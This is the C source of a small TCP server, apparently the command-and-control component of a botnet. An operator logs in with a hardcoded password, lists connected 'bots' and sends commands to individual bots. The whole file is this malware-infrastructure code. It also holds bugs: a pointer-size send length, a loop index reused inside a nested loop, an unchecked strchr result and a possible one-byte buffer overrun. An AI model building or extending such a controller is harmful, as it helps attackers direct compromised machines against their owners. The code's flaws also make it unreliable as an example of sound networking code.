#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/time.h>       // FD_SET, FD_ISSET, FD_ZERO - FD = FILE DESCRIPTOR
#include <netinet/in.h>
#include <arpa/inet.h>      // CONVERSION METHODS htons, htonl, ntohl, ntohs..
#include <errno.h>          // DECLARATIONS FOR ERROR CONSTANTS
#include <pthread.h>
#include "fatal.h"
#include "hexdump.h"
#include "banner.h"

#define PORT 9090

// &X ADDR OF X
// *X POINTER OF X

int main() {
    int server_socket, client_socket[30], new_socket, authorized_socket;
    int max_clients = 30, max_sd, addrlen, sd, activity, i, valread;
    int enabled = 1, con_clients=0;
    char buffer[1024]; // 1KB DATA BUFFER
    char password[] = "password\r\n";
    char *clientlist;
    fd_set readfds;    // SET FILE DESCRIPTORS FOR FUTURE CONNECTIONS

    pbanner();

    char *message= "\n\rWELCOME AUTHENTICATED USER\n\r";

    for(i = 0; i < max_clients; i++){
        client_socket[i] = 0;               // INITIALIZE ALL CLIENT SOCKETS
    }

    struct sockaddr_in host_addr, client_addr;
    host_addr.sin_family = AF_INET;
    host_addr.sin_port = htons(PORT);
    host_addr.sin_addr.s_addr = INADDR_ANY;
    memset(&(host_addr.sin_zero), '\0', 8);

    if((server_socket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
        fatal("SERVER SOCKET COULD NOT BE STARTED\n");

    if(setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &enabled, sizeof(int)) == -1)
        fatal("SETTING OPTION SO_REUSEADDR FAILED\n");

    if(bind(server_socket, (struct sockaddr*) &host_addr, sizeof(host_addr)) == -1)
        fatal("SERVER COULD NOT BIND TO HOST ADDRESS\n");

    if(listen(server_socket, 5) == -1)
        fatal("SERVER COULD NOT COMMENCE LISTENING\n");

    addrlen = sizeof(host_addr);
    printf("STANDBY FOR CONNECTIONS..\n");

    // LISTEN LOOP //
    while(1) {

        FD_ZERO(&readfds);                          // CLEAR FILE DESCRIPTOR FOR CLIENT
        FD_SET(server_socket, &readfds);            // ADD MASTER SOCKET TO FD
        max_sd = server_socket;

        // ADD SLAVE SOCKETS TO FD
        for(i = 0; i < max_clients; i++)
        {
            sd = client_socket[i];

            if(sd > 0)                      // IF SOCKET DESCRIPTOR IS VALID, ADD TO FD
                FD_SET(sd, &readfds);

            if(sd > max_sd)                 // SET HIGHEST FD NUMBER TO MAX SD NUMBER
                max_sd = sd;
        }

        // WAIT FOR ACTIVITY, TIMEOUT IS NULL
        activity = select( max_sd + 1, &readfds, NULL, NULL, NULL);

        // EINTR = INTERRUPTED FUNCTION  [ <errno.h> decleration ]
        if((activity < 0) && (errno!=EINTR)) {
            fatal("SELECT FUNCTION ERROR DURING MULTIPLEXING\n");
        }

        // IF IT'S ACTIVITY ON THE SERVER SOCKET - INCOMING CONNECTION
        if(FD_ISSET(server_socket, &readfds)){
            if((new_socket = accept(server_socket, (struct sockaddr *)&client_addr, (socklen_t*)&addrlen)) == -1)
                fatal("SERVER COULD NOT ACCEPT NEW SOCKET FROM SERVER SOCKET\n");

            printf("[->] CONNECTION FROM %s:%d | FILE DESCRIPTOR IS %d\n",
                inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), new_socket);

                con_clients++;



            for(i = 0; i < max_clients; i++) {
                if(client_socket[i] == 0)       // IF CLIENT SOCKET IS NOT USED
                {
                    client_socket[i] = new_socket;
                    printf("[--] ADDING TO LIST OF SOCKETS AS %d\n", i);
                    break;
                }
            }
        }

        // IF IT'S ACTIVITY ON A CLIENT SOCKET - IO OPERATION
        for (i = 0; i < max_clients; i++) {
            sd = client_socket[i];

            if(FD_ISSET(sd, &readfds))
            {

                if((valread = read(sd, buffer, 1024)) == 0) // IF SOCKET REPLIES ZERO
                {
                    getpeername(sd, (struct sockaddr*)&client_addr, (socklen_t*)&addrlen);
                    printf("[!!] CLIENT DISCONNECTED %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));

                    con_clients--;

                    // TERMINATE THE SOCKET AND FD
                    close(sd);
                    client_socket[i] = 0;
                }

                else if (client_socket[i] == authorized_socket) {
                    buffer[valread] = '\0';
                    printf("[--] Command from %s:%d > %s", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), buffer);
                    dump(buffer, strlen(buffer));

                    // LIST ALL CLIENTS COMMAND
                    if(strncmp(buffer, "list", strlen("list")) == 0) {
                        for(i = 0; i < max_clients; i++) {
                            if(client_socket[i] != authorized_socket) {
                                getpeername(client_socket[i], (struct sockaddr*)&client_addr, (socklen_t*)&addrlen);
                                if(client_socket[i] != 0) {
                                    printf("[#%d] %s:%d\n", i, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
                                    asprintf(&clientlist, "[#%d] %s:%d\r\n", i, inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
                                    send(authorized_socket, clientlist, strlen(clientlist), 0);
                                }
                            }
                        }
                    }

                    // SEND COMMAND TO CLIENT  [SEND <CLIENT_FD>:<MESSAGE>]
                    else if(strncmp(buffer, "send", strlen("send")) == 0) {
                        int x = buffer[5] - '0';
                        char *a = strchr(buffer, ':');
                        *a = '\0';
                        printf("%d : %s\r\n", x, a + 1);
                        send(client_socket[x], a + 1, sizeof(a + 1), 0);
                    }

                    // LIST ALL AVAILABLE COMMANDS
                    else if(strncmp(buffer, "help", strlen("help")) == 0) {
                        send(authorized_socket, "list [lists bots]\r\n", strlen("list [lists bots]\r\n"), 0);
                        send(authorized_socket, "send <bot number>:<message> [sends a command to a bot]\r\n", strlen("send <bot number>:<message> [sends a command to a bot]\r\n"), 0);
                    }

                    // MORE COMMANDS..
                }
                else if(strncmp(buffer, password, valread) == 0) {   // AUTHENTICATE USER
                    buffer[valread] = '\0';
                    printf("[--] Authenticated %s:%d\n", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port));
                    authorized_socket = client_socket[i];

                    char *welcome;
                    asprintf(&welcome, "%c]0;%s%d%c", '\033', "Clients connected: ", con_clients , '\007');

                    send(authorized_socket, welcome, strlen(welcome), 0);

                    if(send(new_socket, message, strlen(message), 0) != strlen(message))
                        fatal("SERVER COULD NOT SEND GREETING MESSAGE TO AUTHORIZED CLIENT\n");
                }
                else {  // ECHO BACK MESSAGE
                    buffer[valread] = '\0';
                    printf("[--] Message from %s:%d > %s", inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), buffer);
                    if(authorized_socket != 0)
                        send(authorized_socket, buffer, strlen(buffer), 0);
                }
            }
        }
    }
    return 0;
}
